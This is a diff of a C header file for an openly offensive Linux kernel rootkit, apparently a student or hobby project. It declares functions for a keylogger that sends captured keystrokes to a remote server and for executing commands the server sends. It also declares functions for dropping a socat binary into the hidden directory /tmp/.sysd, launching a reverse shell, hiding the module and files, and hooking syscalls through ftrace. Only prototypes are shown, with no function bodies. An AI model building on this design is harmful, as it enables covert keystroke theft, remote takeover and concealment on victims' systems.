@@ -66,28 +66,29 @@ extern struct task_struct *network_thread;	// Thread for network communication
 extern bool thread_exited;					// Flag to indicate if the thread has exited
 
 // Function prototypes
-int init_exec_result(void);								// Initialize exec_result structure
-int exec_str_as_command(char *user_cmd);				// Execute a command string in user mode
-int send_to_server(char *message);						// Send a message to the server
-int network_worker(void *data);							// Kernel thread for network communication
-char *read_file(char *filename);						// Read the content of a file into a dynamically allocated buffer
-void print_file(char *content, enum text_level level);	// Print the content of a buffer to the kernel log
-int close_socket(void);									// Release the socket
-int close_thread(void);									// Close the kernel thread
-int epikeylog_init(int keylog_mode);					// Initialize the keylogger
-int epikeylog_send_to_server(void);						// Send keylogger content to the server
-void epikeylog_exit(void);								// Cleanup function for the keylogger
-int drop_socat_binaire(void);							// Drop the socat binary in /tmp/.sysd
-void launch_reverse_shell(void);						// Launch the reverse shell with socat
-void stop_reverse_shell(void);							// Stop the reverse shell
+int init_exec_result(void);									// Initialize exec_result structure
+int free_exec_result(void);									// Free exec_result structure
+int exec_str_as_command(char *user_cmd);					// Execute a command string in user mode
+int send_to_server(char *message, ...);						// Send a message to the server
+int network_worker(void *data);								// Kernel thread for network communication
+char *read_file(char *filename);							// Read the content of a file into a dynamically allocated buffer
+int print_file(char *content, enum text_level level);		// Print the content of a buffer to the kernel log
+int close_socket(void);										// Release the socket
+int close_thread(void);										// Close the kernel thread
+int epikeylog_init(int keylog_mode);						// Initialize the keylogger
+int epikeylog_send_to_server(void);							// Send keylogger content to the server
+int epikeylog_exit(void);									// Cleanup function for the keylogger
+int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
+int launch_reverse_shell(void);							// Launch the reverse shell with socat
+int stop_reverse_shell(void);								// Stop the reverse shell
+int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server
 
 extern char *ip;
 extern int port;
 extern char *message;
 
 // Hooks and Ftrace parameters
-struct ftrace_hook
-{
+struct ftrace_hook{
     const char *name;       /* Name of the target symbol */
     void *function;         /* Address of the hook function */
     void *original;         /* Pointer to storage for the original address */
@@ -121,8 +122,8 @@ int remove_hidden_dir(const char *dirname);
 int is_hidden(const char *name);
 
 // Module Hider
-void hide_module(void);		// Hide the module from the kernel
-void unhide_module(void);	// Unhide the module in the kernel
+int hide_module(void);		// Hide the module from the kernel
+int unhide_module(void);	// Unhide the module in the kernel
 
 // Directory entry structure as 'returned' (by pointer) by getdents64 syscall
 // Used to read a directory content
